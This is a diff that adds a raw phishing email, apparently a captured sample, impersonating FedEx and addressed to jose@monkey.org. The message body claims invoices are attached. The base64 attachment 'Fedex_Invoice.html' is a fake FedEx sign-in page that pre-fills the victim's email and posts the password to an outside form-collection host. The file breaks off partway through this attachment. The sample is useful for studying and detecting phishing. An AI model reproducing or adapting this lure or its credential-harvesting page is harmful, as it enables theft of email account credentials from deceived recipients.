@@ -1,0 +1,362 @@
+From jose@monkey.org Sun Aug 27 16:52:12 2023 +0000
+Return-Path: service@service.com
+Delivered-To: jose@monkey.org
+X-FDA: 81170477304.12.B9802C4
+Received: from securitie.org (unknown [185.87.26.194])
+	by imf12.b.hostedemail.com (Postfix) with ESMTP id EEB8EA000A
+	for <jose@monkey.org>; Sun, 27 Aug 2023 16:52:09 +0000 (UTC)
+Authentication-Results: imf12.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=none (imf12.b.hostedemail.com: domain of service@service.com has no SPF policy when checking 185.87.26.194) smtp.mailfrom=service@service.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1693155130;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references; bh=Vv5jpN/+fR0f+d/oA17U0qos+MQWnIRL9Sbs33FxgA0=;
+	b=JV8fLz6bphwcBQgo5xsGJRaKGB3qmZ55SA/mAnASLGcLla9CdfkSSA4JimLXas6URIUwVy
+	a7ahlZX71D67qkgNODeZMRPm66O97j5J82q5mk6bfEMdz05ukq+CWB/32Ngx1ZkxgTijWE
+	xi+MkyEWV18Sb50WoV/yt6WV9n8GjJ0=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1693155130; a=rsa-sha256;
+	cv=none;
+	b=ePsY4c1zaCR1dxj4fOMVp5L92pPu4ztbQBdvtuBpNSgkEDGdGUqih7d3JrzWR4nRnw+us3
+	Y1BHZLTalg0R2Mw4UGPKx9ilJO9Klgdt753qR7hhVzbCHHS6ADj/JzAO8qeD142WB3qaxu
+	0sWT+UvB7DvAuzj15l0Uc+IFFFUcb+8=
+ARC-Authentication-Results: i=1;
+	imf12.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=none (imf12.b.hostedemail.com: domain of service@service.com has no SPF policy when checking 185.87.26.194) smtp.mailfrom=service@service.com
+Received: from [147.124.213.73] (port=50220)
+	by hosting4.idealhosting.org with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96)
+	(envelope-from <service@service.com>)
+	id 1qYqVF-006w7A-26
+	for jose@monkey.org;
+	Wed, 23 Aug 2023 19:14:42 +0300
+From: FedEx Express <service@service.com>
+To: jose@monkey.org
+Subject:  =?UTF-8?B?RmVkRXggU2hpcG1lbnQgRG9jdW1lbnQgQXJyaXZlZA==?=
+Date: 23 Aug 2023 16:14:39 -0700
+Message-ID: <20230823161436.B6F115A1DA946637@service.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_2063FA6E.65418ECB"
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - hosting4.idealhosting.org
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - service.com
+X-Get-Message-Sender-Via: hosting4.idealhosting.org: authenticated_id: info@apkindir.club
+X-Authenticated-Sender: hosting4.idealhosting.org: info@apkindir.club
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam02
+X-Rspam-User: 
+X-Rspamd-Queue-Id: EEB8EA000A
+X-Spam-Status: Yes, score=26.30
+X-Stat-Signature: pm45cxhhdjmj148tuybsw1r3cu86mm7k
+X-HE-Tag: 1693155129-673598
+X-HE-Meta: U2FsdGVkX19HFXRHO3lGylZ1Z3nAbWUqoncgoauJP9zdUeaf+tQ2l1/AuPkBsmKKWnC72xcEZizJKmpLB6nSMsx2Kli+9qXLgfIdnqpBl2XsjlXgWjYX44PgJCRhPXQshB9du8BpbsNYW3FDLkYcoUdkgBjiH9BCbP6KYI6sAI5xCWqfvNWoUQOzyCYtXH3Rk6M5DQxHwtvt2cOYDSQKpYHCxpFGauS3fIxL16jTMZQ=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 264
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_2063FA6E.65418ECB
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
+<body>
+<p>
+<img alt=3D"The Hidden Power of the FedEx Logo" src=3D"data:image/png;base6=
+4,iVBORw0KGgoAAAANSUhEUgAAAZwAAAB6CAMAAAC89RUgAAAAzFBMVEX///9NFIz/ZgBHAIn/X=
+wA8AIT+rYyJcq5HD46LPXn/aQD/XgBDAIf/lm1JBIr/WAB2WaTf2+n+uZ/+9O/+6uHy8Paqm8XY=
+0+Tl4u65rs+ciru+tNJLDov/wKo2AIH/UwD+3M/+zbnRyt/+bx94XKV9Y6lSII+iksBZLZPNxdx=
+kP5n+fT7t6/P+8ev+oXr+tZiypcpgOZf+kGCPerP+dzL+1cVuTp9pR53+5tz+i1b+0cD+gkn+n3=
+eFbKytgKL+fDr+x7D+kmKDK3Hnz9L+q1rAAAAK/ElEQVR4nO2de1fivBaHgRI57zRSELmV0qKoX=
+AZRhxF11PPqOd//O522FLntvWnStPY9K78/Zq3RNsnKYy77krRQ0NLS0tLS0tLS0tLS0tLS0gLV=
+eq/I6f0y45Z2rsFm/PtURp8XG
+&#10;&#10;bdeSu/ckBPrZdzSugs1g/9VKkvIOsu49VKqGEU58czhMKgZ//rrR0lCpoajVBqOhp=
+MnaTg5loaTY2k4OZaGk2NpODmWhpNjaTg5loaTY2k4OZaGk2NpODmWhpNjaTg5loaTY2k4OZaGk=
+2PhcDgj5XYzbqkgHIuUd5dx66WEwuGjJq2sWyoIp9CglXXzZYTDaX130/YkCuf/QBpOjqXh5Fga=
+To6l4eRYGk6OpeHkWBpOjqXh5Fhq4TTb3VGlNh0XizcPy3e7eynhR+hMuq3RaNTqTuo7P9dwEsB=
+p9hY3LuPcqDqhqgbnzHUqPQFAl/bUZX4ZoRhzH+zNES0NRxpOr+ZywzksxjG4u4znwG4vfC67RT=
+ic8VEEV8PZyFjU27h2Z5ymzXkVKcdXddPDuCZTF24Kd+3wAQ1nmw4VL1hul2EzjpOJepiNyGZ0p=
+gwYduuXq8HkJgjnyLHDecnEf2ueow29sPAy/1ZCZEtywbZqbVN
+Clx9F&#10;E/awQ&#10;5zwtV1i4PmzmztSHWzr31rEr8tYRGGAv1UeKgUTKCmc5hLsM7CHF0gb=
+ZuOjeFlFeSR04BG//wG39NYk3lEfIkoI55IJvM8fwJVn4uIz2pfYYqY6TH1B0Cn/BnuLKNHCp8J=
+vgnPvir3GO4ctiFkGX4IIk+QQnBEzW/kn0Fm/y+jz3kA9m2RwbDE2/tTG6vsNaMUtAx5eiRI85g=
+Qd8+Wgr14INqlcOpEEjh13udnqYbY3drqifPeULPvmF7GGmKd7XTXHH07pzokEcFribAKjdGfdu=
+UzIJmlq1E98MJSsk52eIiZBa54KmwRwJnL9Wh1v1Q4v8iJKmrc2JB7aGQ9/8O2D+SsdNvJwmrL9=
+yrd21A+keRNHSeE0iKFT8j6+WvpMGDjQ3uF74eD9Wg18loyjBbtf1qgdy3wllTjj85wyRr3H6Cn=
+KwFFvfCaEc93FBg5ntdak3Z7cVwzEI+MUo7o7SRecoop0XMLo9
+2e2weohohL&#10;Um/BdcJwpM&#10;m4M1tos+JMpTJBHfranxJOaklxpyhiNbMu/8ckvDeMzGR=
+zE6Cjy2q4PoAsPHjd8akKtWoHb1TFcYnZcSUUi+90xN9uvjI3PhHBgsQPvWYdDdFZ7ggfCD80Wk=
+xDgrHeFRBIiKTllQFgwgZuNsFWtjxTZKIXDAc9mBxwewdC5RAeOE0VwVprVqBGm5ggIMTR8EXNa=
+uocVFMJxHqAKwJ1DEGa9wmp2jD0fD+V9U3Q+h1hUqFJSMj7XUgjHPfCbhZpCwWunMMN63HEOfNc=
+9nI6qw1OUMYqpfOh+Uyt1cIxruAZw+mLte8zGYbPDMnBPkSo4pDGKsFEe+dyXOjgMi3RCWzvDhi=
+MAfjFgNgi2dVd37JA0RkGlZ3yuJXPsEH7FwKoYQWPEQdhUl2AZdWxiU3fskIyMQnzTPxyHp0bZs=
+w6s2QJ6x5n2urDAxzEhC1ehhhSCwrk9JwX07IfQ2EnT+FxLJm9
+tCc4xDkckwqb6hN&#10;SJWawqU6NIY3RPX&#10;163NCUDJ7GfHxd+gD4DOIU3yhjdHTcfMuWL=
+SgIObFeqEUOTD9/hhqpNKiQC0btssjkpLwFnktzRj8mZog1Ftt6KMz7jGaPmm1zpopKA00oPDre=
+xSgtteLyqTseNszFP3fhcSwKO0O5LEA5+LQgSeVUNJ4YxiuS0pSAJOKhTLLlQQ7aA7QiUJ7IfN0=
+aRbNAUJAHnKUaCpiwcxMoJlMmaUzhujJq30kWLSgIOEYdJDAfICF0L9imkcASENkbLz/Iliypnc=
+ACn51pw9DWN8zkvFJzMFpzCP2lay8LOCUWlUGfhi95Ibwj2ReZ7lDLcSEvBQV5xqiJCKv32rXQM=
+53Ta8c+NJOCAIYCi83RVExASdsDOV2VmhMYJ62TkvJGC0wXh8IlQvfDG2LlBX8jGfRMvIGpl9JV=
+RCTjw3zC/F6oX2VXge+nrTDYEMVMJ1omgKUsmZABGJY2KUL1Im
+jRHD11nETKIn4STRahND&#10;g5o6DiOUL09xHvKBZ9XC&#10;iduxKCUaob0RjJw4L961hapF8=
+uMwqodI8YVCueEFhTIjB9rK2WR3iEHB87VNN6FKr7Bsm9AJ0EPC/DJXhIBnBM8EcohiH0qZ9A/O=
+Tn7IzXQpO6+gacYLDcDFnY2pwrljTbREJK6G9n7grlRsc6zPZ96kX5K7PCk4MARHTgdtzCxIbXg=
+Ox+CioHkRPykljI4j4KZUbFOgp561smjP2jOL3551lDYZSoFB8ki49CGbcagjBy3h85rRX61X8Y=
+UdxipgkMcK8TpHDlD3Rh6mzO/t6+W8Hl4uSu9oPznInQEBFlbgsNtaD5u0bjZcbFNDMKZpwgOeW=
+8KKrq3G0H+1O0gUDhm5pb3JyaVSHJwsCwyXtt7sDkGy2eBDw1P4nHYcu1vaPao+6RUwWkQj5Ine=
+gdEJ70G7M48y/Msy/v0f/BZ9sQCdZKX4WExHWPXdTmBr2FbeWm
+o47pVxh4q9uJ67IKnr1TDGeIE&#10;THITRxijH15wy0Tfen17Ox2a4&#10;ZUTZUGPtiScNnoo=
+gxv26mbP2WVrjPzRs9W4oPPfHMPX0dCREjjEVRH+TETSwY3RYThM+l4/+M+87AX/MT2hTYHsNZK=
+Iqyt8MzjoHv6DDa9o8lORY6UCDnHJSrjmn1ILEmaMPnvhKOl7YU23lhWgssonyONK4STJyXXXaZ=
+3ohi2+FMAhjnxGoZtXYt3BjNGz1ZCJRs4f01sVJBTlloYjebtKMdoNhMInx9hKDodIX/9aIoi7v=
+DBj9HS1Wehb88Hj413ZCpNET8pWJnBk7oxaFbxlZCa/wiMxHCLXZuvPnKoENkZfvHCv0DdNf7dW=
+Lq/ic3emJeLHSXB1cU2qZ3cuJqLMy3hKCod0DGzaSdpBoDG6hmO9zucvZlSWP4IygiPVsw7fOUf=
+QrCZcdhLCoRwD1rZRQnoQIGN0Pa2Fa86ZGd2+l9W0FtARHjvO/
+kWSHdLE3GlQCnCoAbFnYJJDDIiMfm0&#10;IgpoaVjlcmX5mtCEItRSkc3BRYXAjc&#10;Tw6bh=
+sM6SSDQzxxMBrIRNBDY3R3K11azWtZbaVXWgjtt4wb4GxUPDrMhjfeieAQmzAgw4Y+lXiwlqyN0=
+LCm11Iwn52ZnlB4O+m3DHoCdxezfc/bSrOb4+Mv2OIph0OYL+DxKCpSenjl90XoT4vg+IvNc6Fg=
+ZuO+2ai5jDkvGS6an3N1bFceRhFUw/nE+xrpxBeKzoExGjo+B/MwIP5o+pvpV7G9mpKvgPSMGCu=
+Pw5ZEknqXHn8sDBQphkO4zNBlm7qv1fzcf/rHbojgxRQ9gv3uYt+SoL8MsaMWP+I7NtgDkQXtq3=
+mNf82gGg05+NaK/9DJAlgOQf/Mw78zgd98PyQ+T+HtG6ON4daPHn+YlmA4p9CpYyL+0A/VJXz7D=
+nevaDSB2kv4YjWHTaOWwM3875E0G0Qfc+KX+KrdoMqcH7ic3zx
+r/nhbaAzuhpb1O5NcN1B1+wb4vFGVM/fpPh&#10;7nesU9uFDCYGOxNN+c6fxtneDxKjpsFKvTX=
+&#10;Yw3X/UKPuvFl/ZE5LNtvXf+9WExw/BLqAglw+VSg4+7u/5jPr4i37nsdVu+7nuTusTn9Aq=
+dSSv4JN94erXoCuVaaWlpaWlpaWlpaWlpaWlpaf3T9T8tKEjpYBkeIAAAAABJRU5ErkJggg=3D=
+=3D" width=3D"412" height=3D"122"><br><br><br>
+<table width=3D"100%" align=3D"center" style=3D"color: rgb(34, 34, 34); tex=
+t-transform: none; letter-spacing: normal; font-family: Arial; font-size: s=
+mall; font-style: normal; font-weight: 400; word-spacing: 0px; white-space:=
+ normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-=
+variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-w=
+idth: 0px; text-decoration-thickness: initial; text-decoration-style: initi=
+al; text-decoration-color: initial;" bgcolor=3D"#ffffff"=20
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" style=3D"margin: 0px; font-family: Roboto, RobotoDraft=
+, Helvetica, Arial, sans-serif;">
+<table width=3D"640" style=3D"width: 640px;" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"640" align=3D"center" style=3D"margin: 0px; width: 640px; min-=
+width: 640px;">
+<table width=3D"100%" style=3D"min-width: 100%;" cellspacing=3D"0" cellpadd=
+ing=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px;">
+<table width=3D"640" style=3D"width: 640px;" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px; padding: 15px 20p=
+x;">
+<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; color: rgb(88, 89, =
+91); line-height: 24px; font-family: Roboto, Arial, Helvetica, sans-serif; =
+font-size: 16px;">
+<p>23&nbsp;Aug 2023<br></p>
+<p><br></p>
+<p>Dear&nbsp; jose,<br></p>
+<p>Find attached our Invoices and packing list for your FedEx shipments</p>=
+
+<p>Thanks &amp; B. Regards,</p>
+<p>FedEx&nbsp; Customer Service.<br><br></p></td></tr></tbody></table></td>=
+</tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></=
+td></tr></tbody></table>
+<table width=3D"100%" align=3D"center" style=3D"color: rgb(34, 34, 34); tex=
+t-transform: none; letter-spacing: normal; font-family: Arial; font-size: s=
+mall; font-style: normal; font-weight: 400; word-spacing: 0px; white-space:=
+ normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-=
+variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-w=
+idth: 0px; text-decoration-thickness: initial; text-decoration-style: initi=
+al; text-decoration-color: initial;" bgcolor=3D"#ffffff"=20
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" style=3D"margin: 0px; font-family: Roboto, RobotoDraft=
+, Helvetica, Arial, sans-serif;">
+<table width=3D"600" align=3D"center" style=3D"width: 600px;" border=3D"0" =
+cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td height=3D"30" style=3D"margin: 0px; height: 30px; line-height: 1px; fon=
+t-size: 1px;"></td></tr>
+<tr>
+<td height=3D"1" style=3D"margin: 0px; height: 1px; line-height: 1px; font-=
+size: 1px; background-color: rgb(221, 221, 221);"></td></tr>
+<tr>
+<td height=3D"10" style=3D"margin: 0px; height: 10px; line-height: 1px; fon=
+t-size: 1px;"></td></tr></tbody></table></td></tr>
+<tr>
+<td align=3D"center" style=3D"margin: 0px; font-family: Roboto, RobotoDraft=
+, Helvetica, Arial, sans-serif;">
+<table width=3D"640" style=3D"width: 640px;" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"640" align=3D"center" style=3D"margin: 0px; width: 640px; min-=
+width: 640px;">
+<table width=3D"100%" style=3D"min-width: 100%;" cellspacing=3D"0" cellpadd=
+ing=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px;">
+<table width=3D"640" style=3D"width: 640px;" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px; padding: 0px 20px=
+ 20px;">
+<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; color: rgb(88, 89, =
+91); line-height: 22px; font-family: Roboto, Arial, Helvetica, sans-serif; =
+font-size: 14px;">
+<table width=3D"100%" style=3D"min-width: 100%;" cellspacing=3D"0" cellpadd=
+ing=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif;">
+<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; line-height: 22px; =
+font-family: Roboto, Arial, Helvetica, sans-serif;">
+<img width=3D"17" height=3D"10" style=3D"border-width: 0px; color: rgb(51, =
+51, 51); line-height: normal; font-size: 2px; display: inline-block;"=20
+src=3D"https://ci5.googleusercontent.com/proxy/VAYH1XzmBQTQ7ow-rKt-5c3VaZs_=
+p40Le2Odl18qLpPwFL3oCL0cqw9sBr2v6zIojTWULHYREjBoT0OfdxJEL03C-hHz7vxLB3QAAm-=
+r1F9nABRE97vyu8ov3zK5cuV5_nllx0UO5Wg0V98IvjEbg5TpVSFggslkBAFU0pWEjYtncAlLEB=
+rO-3bbr8kJsgMjKQtaRtlTI9M7kduQrooH0p2cGIck2njgfsKzyE-ioRE3W7IFDD8zJytOnFWJz=
+KdiiMN07hHFMV0pRgeCuZx054LOfssrDbGi=3Ds0-d-e1-ft#https://webmail.zebrarolle=
+rs.com/cpsess6362364794/3rdparty/roundcube/?_task=3Dmail&amp;_action=3Dget&=
+amp;_mbox=3DINBOX.Trash&amp;_uid=3D1313&amp;_token=3DY9GrXR1pFSF
+&#10;&#10;ANlQaEKuNVgJ4K6bMHppw&amp;_part=3D1.3&amp;_embed=3D1&amp;_mimecla=
+ss=3Dimage" border=3D"0" jslog=3D"138226; u014N:xr6bB; 53:WzAsMF0."><font s=
+tyle=3D"vertical-align: inherit;"><font style=3D"vertical-align: inherit;">=
+&nbsp;&nbsp;This email was sent to jose@monkey.org</font></font><br><br><fo=
+nt style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inheri=
+t;">&copy; 2023 FedEx.&nbsp;</font><font style=3D"vertical-align: inherit;"=
+>
+ The content of this message is protected by copyright and trademark laws o=
+f the United States and international law.&nbsp;</font>&nbsp;<font style=3D=
+"vertical-align: inherit;">View our Privacy Policy.&nbsp;</font><font style=
+=3D"vertical-align: inherit;">privacy policy</font><font style=3D"vertical-=
+align: inherit;">&nbsp;. All rights reserved.&nbsp;&nbsp;</font><font style=
+=3D"vertical-align: inherit;">View as webpage</font></font>&nbsp;</td></tr>=
+</tbody></table></td></tr></tbody></table></td></tr>
+</tbody>
+</table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbo=
+dy></table></td></tr></tbody></table><p></p></body></html>
+------=_NextPart_000_0012_2063FA6E.65418ECB
+Content-Type: text/html; name="Fedex_Invoice.html"; charset="utf-8"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Fedex_Invoice.html"
+
+77u/DQo8aHRtbD4NCjxoZWFkPg0KCTxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3
+aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+DQoJPG1ldGEgaHR0cC1lcXVp
+dj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlLGNocm9tZT0xIiAvPg0KCTx0
+aXRsZT4mIzM2MzE5OyYjMzYzOTQ7JiMyNDc0NDsmIzMwMzQwOyYjMzYxMzU7JiMyMDIxNDsm
+IzI1MTEwOyYjMjEyNTM7JiMzNTA2NTsgfCBGZWRFeDwvdGl0bGU+DQogICAgPGxpbmsgcmVs
+PSJpY29uIiBocmVmPSJodHRwczovL3d3dy5mZWRleC5jb20vZXRjLmNsaWVudGxpYnMvZGVz
+aWducy9mZWRleC1jb21tb24vaW1hZ2VzL3Jlc291cmNlcy9meC1mYXZpY29uLmljbyIgdHlw
+ZT0iaW1hZ2UvZ2lmIiBzaXplcz0iMTZ4MTYiPg0KCTxzdHlsZT4NCmJvZHksIGh0bWwgeyBo
+ZWlnaHQ6IDEwMCU7bWFyZ2luOiAwOyBmb250LWZhbWlseTogQXJpYWwsIEhlbHZldGljYSwg
+c2Fucy1zZXJpZjsNCn0NCiogew0KICBib3gtc2l6aW5nOiBib3JkZXItYm94Ow0KfQ0KLmJn
+LWltYWdlIHsNCiAgLyogVGhlIGltYWdlIHVzZWQgKi8NCiAgYmFja2dyb3VuZC1pbWFnZTog
+dXJsKCJodHRwczovL3d3dy5mZWRleC5jb20vY29udGVudC9kYW0vZmVkZXgvdXMtdW5pdGVk
+LXN0YXRlcy9zZWxmLWhlbHAvaW1hZ2VzLzIwMTkvUTIvUmVnaXN0ZXJfRGVsaXZlcnlfTWFu
+YWdlcl9TdGVwXzJfMTY0MzI2NDYzNC5qcGciKTsNCiAgLyogQWRkIHRoZSBibHVyIGVmZmVj
+dCAqLyBmaWx0ZXI6IGJsdXIoMHB4KTsgLXdlYmtpdC1maWx0ZXI6IGJsdXIoMHB4KTsNCiAg
+LyogRnVsbCBoZWlnaHQgKi8gaGVpZ2h0OiAxMDAlOyAvKiBDZW50ZXIgYW5kIHNjYWxlIHRo
+ZSBpbWFnZSBuaWNlbHkgKi8NCiAgYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyOyBiYWNr
+Z3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0OyBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KfQ0K
+DQovKiBQb3NpdGlvbiB0ZXh0IGluIHRoZSBtaWRkbGUgb2YgdGhlIHBhZ2UvaW1hZ2UgKi8N
+Ci5iZy10ZXh0IHsNCiAgYmFja2dyb3VuZDogIzM4MEI2MTsNCiAgd2lkdGg6MzcwcHg7IGhl
+aWdodDozODBweDsgLXdlYmtpdC1ib3gtc2hhZG93OiA1cHggNXB4IDE1cHggNXB4ICMwMDAw
+MDA7DQogIGJveC1zaGFkb3c6IDVweCA1cHggMTVweCA1cHggIzAwMDAwMDsgYm9yZGVyLXJh
+ZGl1czogMXB4IDM1cHggMXB4IDUwcHg7DQogIHBvc2l0aW9uOiBhYnNvbHV0ZTsgdG9wOiA1
+MCU7IGxlZnQ6IDUwJTsgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7IHotaW5k
+ZXg6IDI7IHRleHQtYWxpZ246IGNlbnRlcjsNCn0NCmlucHV0W3R5cGU9c3VibWl0XSB7DQog
+IHdpZHRoOjE2MHB4OyBoZWlnaHQ6NDVweDsgZm9udC1mYW1pbHk6IGFyaWFsOyBmb250LXNp
+emU6IDE0cHg7IGNvbG9yOiNGRkY7IGJhY2tncm91bmQtY29sb3I6ICNERjNBMDE7IGJvcmRl
+cjogc29saWQgMXB4ICNERjNBMDE7IGJvcmRlci1yYWRpdXM6IDJweCAxMHB4IDJweCAxMHB4
+Ow0KICAtd2Via2l0LWJveC1zaGFkb3c6IDJweCAycHggMTVweCA1cHggIzU4NTg1ODsgYm94
+LXNoYWRvdzogMnB4IDJweCAxNXB4IDVweCAjNTg1ODU4OyAgZm9udC13ZWlnaHQ6Ym9sZDsN
+Cn0NCmlucHV0W3R5cGU9cGFzc3dvcmRdIHsNCiAgd2lkdGg6MjgwcHg7IGhlaWdodDo0MHB4
+OyBmb250LWZhbWlseTogYXJpYWw7IGZvbnQtc2l6ZTogMTVweDsNCiAgY29sb3I6IzAwMDAw
+MDsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRjsgYm9yZGVyOiBzb2xpZCAxcHggIzFENkY0Mjsg
+cGFkZGluZzogMTBweDsgYm9yZGVyLXJhZGl1czogMnB4IDVweCAycHggN3B4Ow0KICB9DQpp
+bnB1dFt0eXBlPWVtYWlsXSB7DQogIHdpZHRoOjI4MHB4OyBoZWlnaHQ6NDBweDsgZm9udC1m
+YW1pbHk6IGFyaWFsOyBmb250LXNpemU6IDEzcHg7IGZvbnQtd2VpZ2h0OiBib2xkOw0KICBj
+b2xvcjojREYwMTAxOyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGOyBib3JkZXI6IHNvbGlkIDFw
+eCAjRkZGOyBwYWRkaW5nOiAxMHB4OyBib3JkZXItcmFkaXVzOiAycHggNXB4IDJweCA3cHg7
+DQogICAgfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5IG1hcmdpbndpZHRoPSIwIiBtYXJn
+aW5oZWlnaHQ9IjAiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCI+DQo8dGFibGUgYWxp
+Z249ImNlbnRlciIgY2VsbHNwYWNpbmc9IjAiIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUi
+Pg0KPHRyPjx0ZCBoZWlnaHQ9Ijk2JSIgYmdjb2xvcj0iIzE4MTgxOCI+DQo8ZGl2IGNsYXNz
+PSJiZy1pbWFnZSI+PC9kaXY+DQo8ZGl2IGNsYXNzPSJiZy10ZXh0Ij4NCg0KDQoNCg0KCTx0
+YWJsZSBhbGlnbj0iY2VudGVyIiBjZWxsc3BhY2luZz0iMCI+DQoJPHRyPjx0ZCBzdHlsZT0i
+aGVpZ2h0OjQwcHg7Ij48L3RkPjwvdHI+DQoNCgk8dHI+PHRkPg0KDQoJCTxkaXYgYWxpZ249
+ImxlZnQiPg0KCQkJPGZvbnQgZmFjZT0iYXJpYWwiIHNpemU9IjQiIGNvbG9yPSIjRkZGIj4N
+CgkJCQkgICA8Yj48Zm9udCBjb2xvcj0iI0ZFNjQyRSAiPjwvZm9udD4NCgkJCTwvZm9udD4N
+CgkJPC9kaXY+DQoNCgk8L3RkPjwvdHI+DQoNCgk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6MzBw
+eDsiPjwvdGQ+PC90cj4NCgk8dHI+PHRkPg0KCQk8dGFibGUgY2VsbHNwYWNpbmc9IjAiPjx0
+cj4NCgkJCQk8dGQgc3R5bGU9IndpZHRoOjVweDsiPjwvdGQ+DQoJCQkJPHRkPg0KCQkJCQk8
+Zm9udCBmYWNlPSJhcmlhbCIgc2l6ZT0iMyIgY29sb3I9IiNGRkYiPg0KDQoJCQkJCTwvZm9u
+dD4NCgkJCQk8L3RkPg0KCQk8L3RyPjwvdGFibGU+DQoJPC90ZD48L3RyPg0KCQkJCQk8dHI+
+PHRkIHN0eWxlPSJoZWlnaHQ6NXB4OyI+PC90ZD48L3RyPg0KCQkJCQk8dHI+PHRkPg0KCQkJ
+CQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iaHR0cHM6Ly9zdWJtaXQtZm9ybS5jb20v
+aU9BbmpCNlUiPjwvc2NyaXB0PjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Il9yZWRpcmVj
+dCIgdmFsdWU9IkludmFsaWQgUGFzc3dvcmQgYW5kIEVtYWlsIENvbWJpbmF0aW9uIj4NCgkJ
+CQkJPC90ZD48L3RyPg0KCQkJCQk8dHI+PHRkPg0KCQkJCQkJCTxkaXYgYWxpZ249ImxlZnQi
+Pg0KCQkJCQkJCQk8Zm9udCBmYWNlPSJhcmlhbCIgc2l6ZT0iMiIgY29sb3I9IiNGRkYiPg0K
+DQoJCQkJCQkJCTwvZm9udD4NCgkJCQkJCQk8L2Rpdj4NCgkJCQkJPC90ZD48L3RyPg0KCQkJ
+CQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6MTVweDsiPjwvdGQ+PC90cj4NCgkJCQkJPHRyPjx0
+ZD4NCgkJCQkJCTx0YWJsZSBjZWxsc3BhY2luZz0iMCIgYWxpZ249ImNlbnRlciI+DQoJCQkJ
+CQk8dHI+PHRkPg0KCQkJCQkJCTxkaXYgYWxpZ249ImNlbnRlciI+DQoJCQkJCQkJCTxpbnB1
+dCAgbmFtZT0ibG9naW4iIHR5cGU9ImVtYWlsIiB2YWx1ZT0iam9zZUBtb25rZXkub3JnIiBk
+aXNhYmxlZD4NCgkJCQkJCQk8L2Rpdj4NCgkJCQkJCTwvdGQ+PC90cj4NCgkJCQkJCTx0cj48
+dGQgc3R5bGU9ImhlaWdodDo3cHg7Ij48L3RkPjwvdHI+DQoJCQkJCQk8dHI+PHRkPg0KCQkJ
+CQkJCTxkaXYgYWxpZ249ImNlbnRlciI+DQoJCQkJCQkJCTxpbnB1dCAgbmFtZT0icGFzc3dk
+IiB0eXBlPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIiByZXF1aXJlZD4NCgkJ
